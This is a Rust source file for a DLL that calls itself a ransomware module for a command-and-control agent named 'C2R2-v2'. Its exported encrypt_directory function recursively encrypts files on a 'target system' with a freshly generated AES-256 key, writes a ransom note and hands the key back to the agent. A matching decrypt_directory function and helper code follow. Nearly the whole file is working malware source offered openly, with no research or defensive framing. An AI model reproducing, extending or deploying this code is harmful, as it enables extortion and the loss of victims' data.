//! Ransomware DLL - File encryption module for C2R2-v2.
//!
//! This DLL is loaded dynamically by the agent to encrypt/decrypt files on target systems.
//! It's designed as a separate module to keep the base agent lightweight.
//!
//! # Features
//!
//! - **AES-256-CBC Encryption**: Strong encryption for file content
//! - **Recursive Directory Traversal**: Encrypts files in directories recursively
//! - **Safe File Filtering**: Avoids system files and executables
//! - **Key Generation**: Generates secure random encryption keys
//!
//! # Exported Functions
//!
//! - `encrypt_directory()` - Encrypt files in a directory
//! - `decrypt_directory()` - Decrypt files in a directory
//! - `free_string()` - Free returned strings
//! - `get_version()` - Get module version
//!
//! # Safety
//!
//! All panics are caught to prevent crashing the parent process. Errors are
//! returned as error strings rather than panicking.

#![allow(non_snake_case)]

use std::os::raw::c_char;
use std::ffi::CString;
use std::path::Path;
use std::panic;

mod crypto;
mod fileops;

/// Encrypts all files in a directory and returns the encryption key.
///
/// This function recursively discovers files in the specified directory,
/// encrypts them using AES-256-CBC, and creates a ransom note.
///
/// # Safety
///
/// This function catches panics to prevent crashing the parent process.
///
/// # Arguments
///
/// * `path` - Null-terminated C string containing the directory path
/// * `max_depth` - Maximum recursion depth (0 = unlimited)
///
/// # Returns
///
/// Pointer to a C string containing the encryption key in hex format.
/// **MUST** be freed with `free_string()` when done.
///
/// # Format
///
/// On success: "KEY:64_character_hex_key"
/// On error: "ERROR:error_message"
#[no_mangle]
pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut c_char {
    let result = panic::catch_unwind(|| {
        unsafe {
            if path.is_null() {
                return CString::new("ERROR:Null path provided").unwrap().into_raw();
            }
            
            let c_str = std::ffi::CStr::from_ptr(path);
            let path_str = match c_str.to_str() {
                Ok(s) => s,
                Err(_) => return CString::new("ERROR:Invalid UTF-8 in path").unwrap().into_raw(),
            };
            
            let target_path = Path::new(path_str);
            if !target_path.exists() {
                return CString::new(format!("ERROR:Directory '{}' does not exist", path_str))
                    .unwrap().into_raw();
            }
            
            // Generate encryption key
            let key = crypto::generate_key();
            let key_hex = hex_encode(&key);
            
            // Discover files
            let depth = if max_depth == 0 { None } else { Some(max_depth as usize) };
            let files = fileops::discover_files(target_path, depth);
            
            if files.is_empty() {
                return CString::new("ERROR:No files to encrypt in this directory")
                    .unwrap().into_raw();
            }
            
            // Encrypt files
            let mut encrypted_count = 0;
            for file in &files {
                if fileops::encrypt_file(file, &key).is_ok() {
                    encrypted_count += 1;
                }
            }
            
            // Create ransom note
            let _ = fileops::create_ransom_note(target_path, &key_hex);
            
            // Return key
            CString::new(format!("KEY:{}:ENCRYPTED:{}", key_hex, encrypted_count))
                .unwrap().into_raw()
        }
    });
    
    match result {
        Ok(ptr) => ptr,
        Err(_) => {
            CString::new("ERROR:Panic during encryption").unwrap().into_raw()
        }
    }
}

/// Decrypts all encrypted files in a directory using the provided key.
///
/// This function recursively discovers .encrypted files in the specified directory
/// and decrypts them using the provided key.
///
/// # Safety
///
/// This function catches panics to prevent crashing the parent process.
///
/// # Arguments
///
/// * `path` - Null-terminated C string containing the directory path
/// * `key_hex` - Null-terminated C string containing the 64-character hex key
/// * `max_depth` - Maximum recursion depth (0 = unlimited)
///
/// # Returns
///
/// Pointer to a C string containing the result.
/// **MUST** be freed with `free_string()` when done.
///
/// # Format
///
/// On success: "OK:Decrypted X files"
/// On error: "ERROR:error_message"
#[no_mangle]
pub extern "C" fn decrypt_directory(
    path: *const c_char,
    key_hex: *const c_char,
    max_depth: u32
) -> *mut c_char {
    let result = panic::catch_unwind(|| {
        unsafe {
            if path.is_null() || key_hex.is_null() {
                return CString::new("ERROR:Null parameter provided").unwrap().into_raw();
            }
            
            let path_c_str = std::ffi::CStr::from_ptr(path);
            let path_str = match path_c_str.to_str() {
                Ok(s) => s,
                Err(_) => return CString::new("ERROR:Invalid UTF-8 in path").unwrap().into_raw(),
            };
            
            let key_c_str = std::ffi::CStr::from_ptr(key_hex);
            let key_str = match key_c_str.to_str() {
                Ok(s) => s,
                Err(_) => return CString::new("ERROR:Invalid UTF-8 in key").unwrap().into_raw(),
            };
            
            let target_path = Path::new(path_str);
            if !target_path.exists() {
                return CString::new(format!("ERROR:Directory '{}' does not exist", path_str))
                    .unwrap().into_raw();
            }
            
            // Parse key from hex
            let key_bytes = match hex_decode(key_str) {
                Ok(bytes) => bytes,
                Err(e) => return CString::new(format!("ERROR:Invalid key format: {}", e))
                    .unwrap().into_raw(),
            };
            
            if key_bytes.len() != 32 {
                return CString::new("ERROR:Key must be 32 bytes (64 hex characters)")
                    .unwrap().into_raw();
            }
            
            let mut key = [0u8; 32];
            key.copy_from_slice(&key_bytes);
            
            // Discover encrypted files
            let depth = if max_depth == 0 { None } else { Some(max_depth as usize) };
            let all_files = fileops::discover_all_files(target_path, depth);
            let encrypted_files: Vec<_> = all_files
                .iter()
                .filter(|f| f.to_str().unwrap_or("").ends_with(".encrypted"))
                .collect();
            
            if encrypted_files.is_empty() {
                return CString::new("ERROR:No encrypted files found")
                    .unwrap().into_raw();
            }
            
            // Decrypt files
            let mut success_count = 0;
            for file in encrypted_files {
                if fileops::decrypt_file(file, &key).is_ok() {
                    success_count += 1;
                }
            }
            
            CString::new(format!("OK:Decrypted {} files", success_count))
                .unwrap().into_raw()
        }
    });
    
    match result {
        Ok(ptr) => ptr,
        Err(_) => {
            CString::new("ERROR:Panic during decryption").unwrap().into_raw()
        }
    }
}

/// Frees a string returned by other functions in this DLL.
///
/// # Safety
///
/// This function must be called exactly once for each string returned by
/// encrypt_directory() or decrypt_directory(). Passing a null pointer is safe and does nothing.
///
/// # Arguments
///
/// * `s` - Pointer to C string to free
#[no_mangle]
pub extern "C" fn free_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}

/// Returns the version string of this DLL module.
///
/// # Returns
///
/// Pointer to C string containing version (e.g., "ransomware-dll v1.0.0").
/// Must be freed with `free_string()`.
#[no_mangle]
pub extern "C" fn get_version() -> *mut c_char {
    CString::new("ransomware-dll v1.0.0").unwrap().into_raw()
}

/// Windows DLL entry point.
#[cfg(target_os = "windows")]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: *mut std::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    match fdw_reason {
        1 => {}, // DLL_PROCESS_ATTACH
        0 => {}, // DLL_PROCESS_DETACH
        _ => {}
    }
    1 // TRUE
}

// Helper functions for hex encoding/decoding
fn hex_encode(bytes: &[u8]) -> String {
    const CHARS: &[u8] = b"0123456789abcdef";
    let mut result = String::with_capacity(bytes.len() * 2);
    for &byte in bytes {
        result.push(CHARS[(byte >> 4) as usize] as char);
        result.push(CHARS[(byte & 0x0f) as usize] as char);
    }
    result
}

fn hex_decode(s: &str) -> Result<Vec<u8>, String> {
    if s.len() % 2 != 0 {
        return Err("Hex string must have even length".to_string());
    }
    
    let mut result = Vec::with_capacity(s.len() / 2);
    let mut chars = s.chars();
    
    while let (Some(h), Some(l)) = (chars.next(), chars.next()) {
        let high = hex_char_to_value(h)?;
        let low = hex_char_to_value(l)?;
        result.push((high << 4) | low);
    }
    
    Ok(result)
}

fn hex_char_to_value(c: char) -> Result<u8, String> {
    match c {
        '0'..='9' => Ok(c as u8 - b'0'),
        'a'..='f' => Ok(c as u8 - b'a' + 10),
        'A'..='F' => Ok(c as u8 - b'A' + 10),
        _ => Err(format!("Invalid hex character: {}", c)),
    }
}
